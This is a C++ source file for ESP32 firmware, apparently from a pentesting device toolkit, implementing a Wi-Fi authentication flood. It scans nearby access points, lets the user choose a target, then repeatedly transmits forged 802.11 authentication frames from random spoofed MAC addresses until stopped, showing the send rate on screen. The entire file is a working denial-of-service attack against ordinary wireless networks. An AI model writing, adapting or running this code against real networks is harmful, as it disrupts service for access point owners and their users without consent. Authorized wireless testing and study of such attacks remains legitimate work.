#include "arsenal.h"
#include "arsenal_background.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <globals.h>

void arsenal_auth_flood(void) {
    ARSENAL_HEAP_CHECK();
    if (WiFi.getMode() == WIFI_MODE_NULL) WiFi.mode(WIFI_STA);

    int n = WiFi.scanNetworks(false, true);
    if (n == 0) {
        displayRedStripe("No networks found");
        delay(1500);
        return;
    }

    options.clear();
    for (int i = 0; i < n && i < 15; i++) {
        uint8_t *bssid = WiFi.BSSID(i);
        char bssidStr[18];
        snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
            bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
        String label = WiFi.SSID(i) + " (" + String(WiFi.RSSI(i)) + "dB) " + bssidStr;
        options.push_back({label, [i]() {}});
    }
    int targetIdx = -1;
    for (int i = 0; i < n && i < 15; i++) {
        options[i].operation = [i, &targetIdx]() { targetIdx = i; };
    }
    loopOptions(options, MENU_TYPE_SUBMENU, "Target AP");

    if (targetIdx < 0) return;

    uint8_t targetBSSID[6];
    memcpy(targetBSSID, WiFi.BSSID(targetIdx), 6);
    uint8_t targetChannel = WiFi.channel(targetIdx);
    String targetSSID = WiFi.SSID(targetIdx);
    WiFi.scanDelete();

    drawMainBorderWithTitle("Auth Flood");
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setTextSize(FP);
    tft.setCursor(12, 50);
    tft.printf("Target: %s", targetSSID.c_str());
    tft.setCursor(12, 66);
    tft.printf("Ch: %d BSSID: %02X:%02X:%02X", targetChannel, targetBSSID[0], targetBSSID[1], targetBSSID[2]);
    tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
    tft.drawCentreString(String("Starting..."), tftWidth / 2, tftHeight - 20, 1);
    delay(1000);

    bool bgWasRunning = arsenal_background_is_running();
    if (bgWasRunning) arsenal_background_stop();

    WiFi.mode(WIFI_STA);
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);

    uint8_t authFrame[30];
    memset(authFrame, 0, sizeof(authFrame));
    authFrame[0] = 0xB0;
    authFrame[1] = 0x00;

    uint8_t fakeMAC[6];
    for (int i = 0; i < 6; i++) fakeMAC[i] = random(256);
    fakeMAC[0] |= 0x02;
    fakeMAC[0] &= 0xFE;

    memcpy(authFrame + 10, fakeMAC, 6);
    memcpy(authFrame + 16, targetBSSID, 6);
    memcpy(authFrame + 4, targetBSSID, 6);
    authFrame[24] = 0x00;
    authFrame[25] = 0x00;
    authFrame[26] = 0x01;
    authFrame[27] = 0x00;
    authFrame[28] = 0x00;
    authFrame[29] = 0x00;

    int sent = 0;
    int failed = 0;
    unsigned long startTime = millis();
    unsigned long lastDisplay = 0;

    while (true) {
        for (int i = 0; i < 20; i++) {
            for (int j = 0; j < 6; j++) fakeMAC[j] = random(256);
            fakeMAC[0] |= 0x02;
            fakeMAC[0] &= 0xFE;
            memcpy(authFrame + 10, fakeMAC, 6);
            authFrame[24] = 0x00;
            authFrame[25] = 0x00;
            authFrame[26] = 0x01;
            authFrame[27] = 0x00;

            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, authFrame, sizeof(authFrame), false);
            if (err == ESP_OK) sent++; else failed++;
        }

        unsigned long now = millis();
        if (now - lastDisplay > 200) {
            lastDisplay = now;
            drawMainBorderWithTitle("Auth Flood");
            int y = 45;
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.setTextSize(FP);
            tft.setCursor(12, y);
            tft.printf("Target: %s", targetSSID.c_str());
            y += 14;
            tft.setCursor(12, y);
            tft.printf("Sent: %d  Failed: %d", sent, failed);
            y += 14;
            unsigned long elapsed = (now - startTime) / 1000;
            tft.setCursor(12, y);
            tft.printf("Time: %lus", elapsed);
            y += 14;
            tft.setCursor(12, y);
            tft.printf("Rate: ~%d/s", elapsed > 0 ? sent / elapsed : 0);
            tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
            tft.drawCentreString(String("Esc:stop"), tftWidth / 2, tftHeight - 20, 1);
        }

        if (check(EscPress)) { returnToMenu = true; break; }
        esp_task_wdt_reset();
        delay(10);
    }

    if (bgWasRunning) arsenal_background_start();
}
